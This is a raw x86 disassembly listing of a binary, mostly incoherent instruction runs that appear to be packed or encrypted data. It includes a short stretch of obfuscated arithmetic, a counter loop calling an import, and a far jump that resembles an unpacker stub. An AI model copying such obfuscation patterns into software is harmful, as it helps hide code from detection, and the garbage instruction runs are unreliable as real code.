  408c2c:	and    al,0x16
  408c2e:	lds    ebp,FWORD PTR [ebx+0x7e1f4f83]
  408c34:	test   al,0x83
  408c36:	fist   DWORD PTR [esi-0x64]
  408c39:	(bad)  
  408c3a:	and    BYTE PTR [ecx-0x22],ch
  408c3d:	dec    eax
  408c3e:	sub    ah,bl
  408c40:	out    0x32,al
  408c42:	sbb    eax,0x90abfc21
  408c47:	lahf   
  408c48:	aaa    
  408c49:	retf   0x373c
  408c4c:	xchg   ecx,eax
  408c4d:	inc    edi
  408c4e:	sbb    DWORD PTR [edi-0x33],0x67c2bae9
  408c55:	or     eax,DWORD PTR [ebx+ebp*4+0x35]
  408c59:	or     DWORD PTR [esi+0x25],edi
  408c5c:	dec    edx
  408c5d:	dec    esp
  408c5e:	into   
  408c5f:	pop    ss
  408c60:	and    ecx,DWORD PTR [ebx]
  408c62:	pop    edx
  408c63:	jecxz  0x408bef
  408c65:	mov    cl,BYTE PTR [ecx-0x2455b56d]
  408c6b:	push   0xffffffe7
  408c6d:	push   eax
  408c6e:	test   DWORD PTR [edx-0x40],ebp
  408c71:	call   0x28ba:0x557f5fd4
  408c78:	sub    DWORD PTR [edi-0x5c8a80f8],ebx
  408c7e:	iret   
  408c7f:	push   ecx
  408c80:	loope  0x408cb8
  408c82:	aas    
  408c83:	add    BYTE PTR [edi+0x64283c1],bl
  408c89:	adc    eax,0x5a39575e
  408c8e:	jo     0x408c31
  408c90:	aas    
  408c91:	xchg   BYTE PTR [eax+edx*2-0x5d],al
  408c95:	ficomp DWORD PTR [eax]
  408c97:	jo     0x408ccf
  408c99:	jne    0x408c28
  408c9b:	jnp    0x408cbd
  408c9d:	pop    esi
  408c9e:	clc    
  408c9f:	dec    edx
  408ca0:	adc    edx,DWORD PTR [ecx]
  408ca2:	cmp    cl,bh
  408ca4:	lods   eax,DWORD PTR ds:[esi]
  408ca5:	mov    ebp,0xbcfb013b
  408caa:	(bad)  
  408cab:	fisubr DWORD PTR [esi]
  408cad:	cmp    ebp,edx
  408caf:	lea    ecx,[esi+ebx*8+0xc]
  408cb3:	mov    dh,bh
  408cb5:	ret    
  408cb6:	hlt    
  408cb7:	sbb    eax,DWORD PTR [edx-0x41]
  408cba:	fnstcw WORD PTR [eax+0x7f75b14e]
  408cc0:	shl    dl,0xe2
  408cc3:	inc    ebp
  408cc4:	push   ebp
  408cc5:	adc    DWORD PTR [ebp+0x6],ecx
  408cc8:	jg     0x408c8d
  408cca:	repz ror DWORD PTR [ebp-0x1f690e8b],0x59
  408cd2:	mov    edi,0x3ad74122
  408cd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cd8:	inc    ecx
  408cd9:	mov    bh,BYTE PTR [edx]
  408cdb:	jbe    0x408c5d
  408cdd:	sub    eax,0xefe46fee
  408ce2:	test   al,0x27
  408ce4:	data16 in al,dx
  408ce6:	dec    eax
  408ce7:	mov    BYTE PTR [ecx],0x60
  408cea:	push   0x70f7564e
  408cef:	sub    al,0xae
  408cf1:	ins    DWORD PTR es:[edi],dx
  408cf2:	pop    ss
  408cf3:	add    DWORD PTR [esi],edx
  408cf5:	jmp    0x408c7f
  408cf7:	es inc ebx
  408cf9:	repnz cmp eax,0xeda94bb
  408cff:	mov    dl,0x48
  408d01:	daa    
  408d02:	stc    
  408d03:	and    ecx,DWORD PTR [edi]
  408d05:	test   DWORD PTR [ecx-0x24],eax
  408d08:	(bad)  
  408d09:	dec    DWORD PTR [ebx+0x5e9c6]
  408d0f:	add    BYTE PTR [eax],al
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ffb1
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0xa23327cf
  408e55:	adc    ecx,ebx
  408e57:	jnp    0x408de3
  408e59:	sbb    DWORD PTR [edx+0x62],esp
  408e5c:	sub    ebx,DWORD PTR [edi+0x62]
  408e5f:	bound  ecx,QWORD PTR [ebx]
  408e61:	mov    bh,0x34
  408e63:	fld    TBYTE PTR [eax-0x7f]
  408e66:	push   ss
  408e67:	adc    DWORD PTR [ecx],0x97d79585
  408e6d:	add    eax,0xea2075ff
  408e72:	popa   
  408e73:	retf   0x4508
  408e76:	minps  xmm2,xmm4
  408e79:	das    
  408e7a:	fldenv [edi+0x2367d370]
  408e80:	js     0x408eb6
  408e82:	xchg   edx,eax
  408e83:	lds    ecx,FWORD PTR [ebx-0x36]
  408e86:	mov    dh,0xac
  408e88:	sbb    eax,0x6fe037ff
  408e8d:	ins    BYTE PTR es:[edi],dx
  408e8e:	mov    ah,0x8e
  408e90:	out    0x5a,al
  408e92:	xchg   edx,eax
  408e93:	push   ss
  408e94:	jbe    0x408f08
  408e96:	nop
  408e97:	push   ecx
  408e98:	mov    ebp,ecx
  408e9a:	and    BYTE PTR [ecx-0x29],0x6e
  408e9e:	call   0x5eb2:0x27117575
  408ea5:	xor    cl,BYTE PTR [ebp-0x68fe41f1]
  408eab:	imul   esp,DWORD PTR [edx],0xbcc60043
  408eb1:	ds pop esp
  408eb3:	mov    al,0x26
  408eb5:	ja     0x408e97
  408eb7:	sbb    edi,DWORD PTR [ebx+esi*1-0x25]
  408ebb:	inc    edx
  408ebc:	cdq    
  408ebd:	xchg   esp,eax
  408ebe:	popf   
  408ebf:	adc    BYTE PTR [esi+0x36],bh
  408ec2:	mov    BYTE PTR [esi+ebx*4+0x62],cl
  408ec6:	sahf   
  408ec7:	lea    ecx,[eax]
  408ec9:	pop    eax
  408eca:	push   es
  408ecb:	in     eax,0xd2
  408ecd:	pop    ecx
  408ece:	adc    eax,0xf9c7f6fe
  408ed3:	dec    esi
  408ed4:	add    DWORD PTR [edx+0x69],ebp
  408ed7:	sahf   
  408ed8:	mov    ds:0xa4d55f08,eax
  408edd:	adc    BYTE PTR ds:0x240e7050,0x11
  408ee4:	lahf   
  408ee5:	out    0xff,al
  408ee7:	sbb    esp,DWORD PTR [eax-0x48fd3b78]
  408eed:	push   esi
  408eee:	shr    dh,1
  408ef0:	jmp    0x7344:0x211336fa
  408ef7:	cmc    
  408ef8:	or     dh,ah
  408efa:	jg     0x408ee6
  408efc:	call   0xa8e39192
  408f01:	out    dx,al
  408f02:	and    eax,0xd24d30c9
  408f07:	jns    0x408e90
  408f09:	and    dh,dl
  408f0b:	mov    dh,0xfc
  408f0d:	adc    eax,0x97fee892
  408f12:	out    dx,al
  408f13:	icebp  
  408f14:	xchg   esp,eax
  408f15:	jecxz  0x408eca
  408f17:	popf   
  408f18:	xchg   ebx,eax
  408f19:	push   eax
  408f1a:	test   eax,0x60d92210
  408f1f:	ret    
  408f20:	ss push ds
  408f22:	sar    DWORD PTR [ebp-0x25],0xc
  408f26:	fdivr  st,st(5)
  408f28:	(bad)  
  408f29:	mov    cl,0x40
  408f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f2c:	or     al,0x2e
  408f2e:	mov    eax,ds:0xad4b53e
  408f33:	push   ebp
  408f34:	stos   DWORD PTR es:[edi],eax
  408f35:	mov    cl,0x78
  408f37:	xchg   esp,eax
  408f38:	popa   
  408f39:	sub    ebx,edx
  408f3b:	push   esp
  408f3c:	ficomp WORD PTR [eax+esi*8]
  408f3f:	mov    edx,0x3a7ca2b5
  408f44:	fld    QWORD PTR [ebx]
  408f46:	fmul   QWORD PTR [edi]
  408f48:	or     al,0x1e
  408f4a:	sub    eax,0x45
  408f4d:	sbb    bl,BYTE PTR [eax+edi*8]
  408f50:	out    dx,eax
  408f51:	mov    ecx,0x67e55b19
  408f56:	add    cl,BYTE PTR [eax]
  408f58:	or     esi,ecx
  408f5a:	test   BYTE PTR [eax+0xb],ah
  408f5d:	les    ebx,FWORD PTR [ecx+0x74]
  408f60:	dec    ebx
  408f61:	fwait
  408f62:	pop    esi
  408f63:	add    eax,0x66bf98fb
  408f68:	aaa    
  408f69:	adc    BYTE PTR [ebp-0x60],bl
  408f6c:	xchg   esp,eax
  408f6d:	xor    ch,BYTE PTR gs:[ecx-0x72bad57e]
  408f74:	cmp    al,0x29
  408f76:	and    ebp,ebx
  408f78:	out    0x22,al
  408f7a:	hlt    
  408f7b:	in     al,0x30
  408f7d:	sbb    bl,BYTE PTR [edx+0x6f]
  408f80:	push   cs
  408f81:	push   ecx
  408f82:	fisub  DWORD PTR [edx+edx*2+0x46853df]
  408f89:	jge    0x408f29
  408f8b:	imul   ebp,edx,0xb6ea9686
  408f91:	jp     0x408fdf
  408f93:	stos   DWORD PTR es:[edi],eax
  408f94:	fs or  eax,0x1506ecaf
  408f9a:	xor    eax,0x96243b3a
  408f9f:	ret    
  408fa0:	or     al,0x9e
  408fa2:	test   ah,cl
  408fa4:	sub    BYTE PTR [eax+0x6351ea2a],al
  408faa:	out    0x5c,eax
  408fac:	mov    ecx,0xeaf71736
  408fb1:	fsub   QWORD PTR [ebp-0xe8f7ca9]
  408fb7:	or     al,0x7a
  408fb9:	push   ss
  408fba:	pusha  
  408fbb:	iret   
  408fbc:	mov    eax,ds:0xc088f3b9
  408fc1:	iret   
  408fc2:	outs   dx,BYTE PTR ds:[esi]
  408fc3:	jno    0x408f53
  408fc5:	in     al,0x27
  408fc7:	push   ss
  408fc8:	mov    al,ds:0x849ae3b0
  408fcd:	mov    eax,0x9bd63a5a
  408fd2:	mov    al,ds:0x9e5f33c8
  408fd7:	loope  0x408f8c
  408fd9:	repnz ficomp DWORD PTR [ecx+eiz*8]
  408fdd:	leave  
  408fde:	iret   
  408fdf:	pop    ecx
  408fe0:	retf   
  408fe1:	ins    BYTE PTR es:[edi],dx
  408fe2:	mov    al,BYTE PTR es:0x97b5807
  408fe9:	sub    DWORD PTR [esi],ecx
  408feb:	mov    bh,0x19
  408fed:	repnz ffreep st(6)
  408ff0:	lds    ebp,FWORD PTR [edx]
  408ff2:	retf   
  408ff3:	push   ss
  408ff4:	push   ecx
  408ff5:	pop    esp
  408ff6:	ret    0x8cc5
  408ff9:	repnz sbb eax,0xec955f70
  408fff:	pop    eax
  409000:	es rcr bl,cl
  409003:	push   ebp
  409004:	(bad)  
  409005:	aaa    
  409006:	mov    ss,edx
  409008:	adc    al,BYTE PTR [esp+eax*1+0xe]
  40900c:	pushf  
  40900d:	pop    esi
  40900e:	inc    edx
  40900f:	(bad)  
  409010:	and    BYTE PTR [ebp+0x2f],bh
  409013:	jbe    0x409045
  409015:	push   edi
  409016:	jle    0x408fbf
  409018:	mov    eax,0xa09d33dc
  40901d:	adc    eax,0x22d54b19
  409022:	and    DWORD PTR [edi+0x16b8a487],ecx
  409028:	sub    DWORD PTR [esi-0x15],esp
  40902b:	or     eax,0x2cd98b0b
  409030:	cmp    ch,cl
  409032:	sub    esi,esp
  409034:	fiadd  DWORD PTR [ebx]
  409036:	aad    0x77
  409038:	jo     0x409028
  40903a:	int    0x5f
  40903c:	sbb    bl,BYTE PTR [ecx+0x61]
  40903f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409040:	add    eax,ecx
  409042:	xchg   edx,eax
  409043:	pop    ds
  409044:	aad    0x5
  409046:	cli    
  409047:	test   DWORD PTR [edi],esi
  409049:	sub    DWORD PTR [edx-0x43c0e293],0x45
  409050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409051:	adc    DWORD PTR [ecx+edx*4+0x1e],eax
  409055:	or     eax,0x62123a5a
  40905a:	adc    edx,esp
  40905c:	ret    0xdd13
  40905f:	lock ins BYTE PTR es:[edi],dx
  409061:	sahf   
  409062:	outs   dx,BYTE PTR ds:[esi]
  409063:	lds    ebx,FWORD PTR ds:0xd4cc5d8d
  409069:	lods   al,BYTE PTR ds:[esi]
  40906a:	in     eax,0xcd
  40906c:	cmp    al,0xc
  40906e:	call   0x8000:0x73026952
  409075:	pushf  
  409076:	fistp  QWORD PTR [esi]
  409078:	adc    eax,0xd1167ea9
  40907d:	adc    edx,esp
  40907f:	repz mov eax,0x47bea13b
  409085:	inc    esi
  409086:	inc    esp
  409087:	jp     0x4090bd
  409089:	push   ds
  40908a:	and    esp,DWORD PTR [edi]
  40908c:	loope  0x409069
  40908e:	cld    
  40908f:	and    eax,DWORD PTR [esi-0x15]
  409092:	je     0x4090e4
  409094:	data16 loopne 0x40908d
  409097:	(bad)  
  409098:	mov    eax,ds:0x583bb82b
  40909d:	dec    eax
  40909e:	fsubp  st(5),st
  4090a0:	in     al,dx
  4090a1:	mov    dl,BYTE PTR [eax+0x32]
  4090a4:	cld    
  4090a5:	mov    edi,0x12f3695c
  4090aa:	out    dx,eax
  4090ab:	mov    eax,0xca9a8fa3
  4090b0:	inc    eax
  4090b1:	mov    bh,0x20
  4090b3:	iret   
  4090b4:	push   ds
  4090b5:	in     eax,dx
  4090b6:	mov    dh,0xd3
  4090b8:	mov    ecx,DWORD PTR [edi]
  4090ba:	sub    al,0x84
  4090bc:	sar    DWORD PTR [ebp-0x37],0xae
  4090c0:	outs   dx,BYTE PTR ds:[esi]
  4090c1:	pop    esp
  4090c2:	retf   0xe129
  4090c5:	dec    ebx
  4090c6:	sub    al,0x10
  4090c8:	and    dl,BYTE PTR [ecx+0x66]
  4090cb:	pop    es
  4090cc:	fstp   DWORD PTR [ecx+0x55b65cbc]
  4090d2:	lods   al,BYTE PTR es:[esi]
  4090d4:	es pop es
  4090d6:	mov    ds:0xf38ab8af,eax
  4090db:	fldenv [ebx+0x286d18e3]
  4090e1:	jno    0x409069
  4090e3:	enter  0xba59,0xfe
  4090e7:	rcr    ebp,cl
  4090e9:	jns    0x40907f
  4090eb:	into   
  4090ec:	sub    BYTE PTR [edi+edi*8+0x7c],dl
  4090f0:	inc    eax
  4090f1:	(bad)  
  4090f3:	in     al,dx
  4090f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090f5:	and    al,0x66
  4090f7:	fidiv  WORD PTR [ebp+ecx*4+0x6e729e64]
  4090fe:	mov    dl,0xca
  409100:	pop    ecx
  409101:	out    0xec,al
  409103:	repnz xor BYTE PTR [eax+0x5b],bh
  409107:	sub    BYTE PTR ds:0x4347ca36,0x67
  40910e:	iret   
  40910f:	mov    edx,0x7a3aae7c
  409114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409115:	imul   edi,DWORD PTR [ecx],0xffffffb9
  409118:	dec    eax
  409119:	(bad)
  40911d:	das    
  40911e:	lock test eax,0x966f8f99
  409124:	xchg   edx,eax
  409125:	push   es
  409126:	out    0x33,eax
  409128:	mov    bl,0x37
  40912a:	mov    cl,0x5f
  40912c:	gs fcomip st,st(7)
  40912f:	push   0x31333ab8
  409134:	aas    
  409135:	sub    BYTE PTR [ecx+0x72],dl
  409138:	or     al,0xdb
  40913a:	inc    esp
  40913b:	mov    dl,0xfa
  40913d:	test   ebx,ecx
  40913f:	xor    edi,DWORD PTR [ebx]
  409141:	stos   BYTE PTR es:[edi],al
  409142:	lds    esp,FWORD PTR [esi]
  409144:	repz scas eax,DWORD PTR es:[edi]
  409146:	popa   
  409147:	cdq    
  409148:	popa   
  409149:	xchg   esp,eax
  40914a:	ja     0x4090fd
  40914c:	iret   
  40914d:	outs   dx,BYTE PTR ds:[esi]
  40914e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40914f:	xchg   BYTE PTR [edx+ebx*1-0x57],ah
  409153:	sub    al,0x18
  409155:	mov    eax,0xf6ef4c0c
  40915a:	mov    ebp,0xc2da0602
  40915f:	jl     0x40912b
  409161:	scas   al,BYTE PTR es:[edi]
  409162:	push   edx
  409163:	icebp  
  409164:	sub    esp,DWORD PTR [eax-0x5f]
  409167:	cmp    dl,bh
  409169:	or     DWORD PTR [ecx+0x58],ebp
  40916c:	fisubr DWORD PTR [ebx+edx*8+0x6f]
  409170:	cmp    ebp,DWORD PTR [edi+0x18934ad]
  409176:	and    BYTE PTR [esi],cl
  409178:	jg     0x4091be
  40917a:	or     DWORD PTR [edi],ebp
  40917c:	and    ebx,eax
  40917e:	icebp  
  40917f:	jmp    0xb483:0xa8b765da
  409186:	stc    
  409187:	xchg   ebx,ebp
  409189:	call   0xb6f480cb
  40918e:	mov    eax,0xbac0003
  409193:	jbe    0x409144
  409195:	shl    DWORD PTR [eax+0x665c9eed],0x3a
  40919c:	jb     0x40917f
  40919e:	jge    0x409147
  4091a0:	mov    ds:0xeea71b68,al
  4091a5:	pop    ebp
  4091a6:	push   esi
  4091a7:	cmp    al,0xe0
  4091a9:	hlt    
  4091aa:	jl     0x409216
  4091ac:	mov    ah,0x8e
  4091ae:	cmp    eax,0x2c89fe22
  4091b3:	enter  0xbf28,0xd8
  4091b7:	cmp    al,0xd0
  4091b9:	sbb    eax,0x10ff94a4
  4091be:	or     BYTE PTR [esi+edx*2-0x62],0xb3
  4091c3:	test   eax,0x948e37d9
  4091c8:	push   eax
  4091c9:	call   0xcd242b89
  4091ce:	mov    edx,0x1d401bc
  4091d3:	xchg   BYTE PTR [edx-0x3150c986],ah
  4091d9:	test   al,dl
  4091db:	jno    0x40917c
  4091dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091de:	(bad)  
  4091df:	dec    esp
  4091e0:	ja     0x4091f1
  4091e2:	lods   al,BYTE PTR ds:[esi]
  4091e3:	out    dx,al
  4091e4:	je     0x4091d7
  4091e6:	jmp    0x82313f2d
  4091eb:	arpl   WORD PTR [eax-0x4c],bp
  4091ee:	sahf   
  4091ef:	mov    al,ds:0xc0d54b51
  4091f4:	mov    WORD PTR [edx],cs
  4091f6:	pop    edi
  4091f7:	loop   0x4091fc
  4091f9:	and    ah,BYTE PTR [eax-0xbc7bca9]
  4091ff:	je     0x4091e7
  409201:	dec    eax
  409202:	inc    esi
  409203:	xor    al,0x42
  409205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409206:	js     0x409243
  409208:	rcr    BYTE PTR [ebx+edi*2-0x34182944],1
  40920f:	cdq    
  409210:	push   edi
  409211:	fst    DWORD PTR [eax+ebx*1-0x415f6f]
  409218:	push   DWORD PTR [esi]
  40921a:	pop    eax
  40921b:	adc    al,0x26
  40921d:	arpl   WORD PTR [edx+0x1bf896aa],si
  409223:	xchg   esi,eax
  409224:	retf   0x5300
  409227:	cmp    edi,DWORD PTR [edx+eax*4+0xc]
  40922b:	mov    ch,0x4
  40922d:	mov    ch,0x37
  40922f:	or     eax,DWORD PTR [ebx]
  409231:	inc    edx
  409232:	or     al,0x3
  409234:	push   ss
  409235:	adc    dh,BYTE PTR [ebx+0x2a]
  409238:	mul    DWORD PTR [edx-0x2e]
  40923b:	or     eax,0x2f39cf45
  409240:	mov    bl,0x74
  409242:	retf   0xdce4
  409245:	or     al,0xfa
  409247:	or     al,0x5d
  409249:	mov    ch,BYTE PTR [eax+eiz*4]
  40924c:	jmp    0xef60:0xaa098992
  409253:	push   ebx
  409254:	push   ecx
  409255:	iret   
  409256:	(bad)  
  409257:	mov    ebx,0x31011d23
  40925c:	mov    esi,0xcd150e08
  409261:	test   al,0x1e
  409263:	inc    esi
  409264:	sub    BYTE PTR [edi],al
  409266:	and    eax,0x1d0ab947
  40926b:	adc    dl,BYTE PTR [esi+0x27]
  40926e:	fs cmc 
  409270:	test   al,0x91
  409272:	stos   DWORD PTR es:[edi],eax
  409273:	dec    DWORD PTR [edx-0x2321c3b1]
  409279:	jno    0x4092c0
  40927b:	jmp    0x40921b
  40927d:	repz add BYTE PTR [eax],ah
  409280:	push   ds
  409281:	test   BYTE PTR [ecx+ecx*4+0x2c],dh
  409285:	sub    eax,0x73504cd5
  40928a:	loop   0x409218
  40928c:	daa    
  40928d:	adc    eax,0x53922af0
  409292:	lahf   
  409293:	sbb    eax,0x8d0e593d
  409298:	mov    BYTE PTR [esi],al
  40929a:	call   0xfdac3420
  40929f:	aas    
  4092a0:	xchg   ecx,eax
  4092a1:	into   
  4092a2:	add    DWORD PTR [esi],esp
  4092a4:	sbb    al,BYTE PTR [ebp-0x20]
  4092a7:	jle    0x4092bc
  4092a9:	pop    edi
  4092aa:	pop    edi
  4092ab:	push   esp
  4092ac:	cmp    dl,bl
  4092ae:	rcl    BYTE PTR [ebp+0x62],cl
  4092b1:	xchg   ecx,eax
  4092b2:	in     al,0x19
  4092b4:	bnd jo 0x4092a4
  4092b7:	stos   BYTE PTR es:[edi],al
  4092b8:	mov    edi,0x61c9bee7
  4092bd:	bound  ebp,QWORD PTR [edi+0x1b]
  4092c0:	adc    edx,DWORD PTR [ecx]
  4092c2:	(bad)  
  4092c3:	outs   dx,BYTE PTR ds:[esi]
  4092c4:	add    edi,ebp
  4092c6:	test   al,0x48
  4092c8:	ret    0x3bf9
  4092cb:	scas   eax,DWORD PTR es:[edi]
  4092cc:	test   DWORD PTR [ebx+0x13],0x850bbd5b
  4092d3:	arpl   WORD PTR [ecx],si
  4092d5:	or     bh,BYTE PTR [edx-0x6b]
  4092d8:	mov    al,ds:0x47eb6208
  4092dd:	push   ebx
  4092de:	lahf   
  4092df:	ss mov bl,0xf7
  4092e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092e3:	xlat   BYTE PTR ds:[ebx]
  4092e4:	xor    eax,0x245000da
  4092e9:	inc    esi
  4092ea:	loop   0x4092fa
  4092ec:	(bad)  
  4092ed:	push   0xffffffb9
  4092ef:	dec    edx
  4092f0:	and    al,0xbd
  4092f2:	adc    bl,BYTE PTR [ebx]
  4092f4:	xchg   BYTE PTR [ecx-0xe],ah
  4092f7:	sbb    DWORD PTR [ebx+0x29c035f7],edi
  4092fd:	inc    esp
  4092fe:	sbb    esp,DWORD PTR [esi-0x47]
  409301:	xlat   BYTE PTR ds:[ebx]
  409302:	cmp    DWORD PTR [edi+0x75],ebx
  409305:	add    al,0x93
  409307:	(bad)  
  409308:	mov    dl,0x2d
  40930a:	mov    ds:0x4331bdab,al
  40930f:	dec    eax
  409310:	icebp  
  409311:	inc    esp
  409312:	cli    
  409313:	call   0xe8674e25
  409318:	push   ds
  409319:	mov    ch,0xea
  40931b:	scas   al,BYTE PTR es:[edi]
  40931c:	fbstp  TBYTE PTR [eax+eiz*1]
  40931f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409320:	inc    eax
  409321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409322:	cld    
  409323:	enter  0x22f5,0x88
  409327:	sub    eax,0x8c48f746
  40932c:	ret    
  40932d:	push   esp
  40932e:	dec    esp
  40932f:	push   ds
  409330:	sub    DWORD PTR [esi+0x4e],esi
  409333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409334:	cmp    DWORD PTR [ecx+0x65],0xffffffb1
  409338:	icebp  
  409339:	pop    ebx
  40933a:	mov    al,0xfd
  40933c:	gs jl  0x40935a
  40933f:	pop    esi
  409340:	mov    bl,dl
  409342:	retf   
  409343:	push   ds
  409344:	xor    al,0x26
  409346:	adc    esp,DWORD PTR [edi+0x6434d9b]
  40934c:	loope  0x409368
  40934e:	mov    edi,0x1580d65a
  409353:	adc    bl,0x8a
  409356:	cmp    bh,bl
  409358:	xor    esi,ebx
  40935a:	cmp    dl,cl
  40935c:	call   0x1a214d26
  409361:	dec    ebx
  409362:	push   esp
  409363:	xchg   ebp,edx
  409365:	shr    DWORD PTR [ebx+0x6b52ffa8],0xc5
  40936c:	or     DWORD PTR [edi+0x5a],esp
  40936f:	fdivr  DWORD PTR [ebp-0x29]
  409372:	cmp    al,0x75
  409374:	push   es
  409375:	xor    bh,bh
  409377:	mov    esi,0xd4f5d2ee
  40937c:	ins    BYTE PTR es:[edi],dx
  40937d:	xchg   bp,ax
  40937f:	test   DWORD PTR [ebx+0x23fbbae9],ebx
  409385:	inc    ecx
  409386:	inc    esp
  409387:	add    DWORD PTR [ebx-0x1118bfaf],ebx
  40938d:	mov    edi,DWORD PTR [edi]
  40938f:	inc    esp
  409390:	icebp  
  409391:	leave  
  409392:	mov    al,ds:0x14f6f7c1
  409397:	repz mov al,0x47
  40939a:	mov    edx,0xd99b4d43
  40939f:	dec    edi
  4093a0:	mov    edx,0x6c4d92f7
  4093a5:	adc    ebp,DWORD PTR [ecx]
  4093a7:	aaa    
  4093a8:	aas    
  4093a9:	mov    BYTE PTR [edx+eax*2+0x8],bh
  4093ad:	mov    gs,WORD PTR ds:0x40cd8660
  4093b3:	jl     0x40937c
  4093b5:	hlt    
  4093b6:	fldcw  WORD PTR [edi]
  4093b8:	cmp    BYTE PTR [esi-0x4da5f595],dh
  4093be:	or     ebp,edi
  4093c0:	and    DWORD PTR [ecx],ebx
  4093c2:	(bad)  
  4093c3:	jne    0x409414
  4093c5:	push   edx
  4093c6:	inc    esi
  4093c7:	xlat   BYTE PTR ds:[ebx]
  4093c8:	pop    esi
  4093c9:	push   esi
  4093ca:	xchg   edx,eax
  4093cb:	sbb    eax,0x18a8fc6e
  4093d0:	cmp    BYTE PTR [edi+0x9],bh
  4093d3:	into   
  4093d4:	push   ecx
  4093d5:	out    0x5a,al
  4093d7:	cli    
  4093d8:	jge    0x40937c
  4093da:	sub    al,0xd8
  4093dc:	ja     0x4093ac
  4093de:	xchg   ebp,eax
  4093df:	retf   
  4093e0:	pop    esi
  4093e1:	add    cl,dh
  4093e3:	sbb    eax,DWORD PTR [edx]
  4093e5:	add    edx,DWORD PTR [edx]
  4093e7:	jno    0x40943b
  4093e9:	sub    al,0xc1
  4093eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093ec:	daa    
  4093ed:	or     DWORD PTR [esi],0xddbbd9e9
  4093f3:	mov    ds:0x115ba516,al
  4093f8:	mov    esp,0x9bdc5ab
  4093fd:	or     al,BYTE PTR [ebx-0x5a673340]
  409403:	or     eax,0xcab1964a
  409408:	mov    DWORD PTR [esi+0x5b887190],edx
  40940e:	cld    
  40940f:	mov    cl,0x1a
  409411:	stos   BYTE PTR es:[edi],al
  409412:	scas   al,BYTE PTR es:[edi]
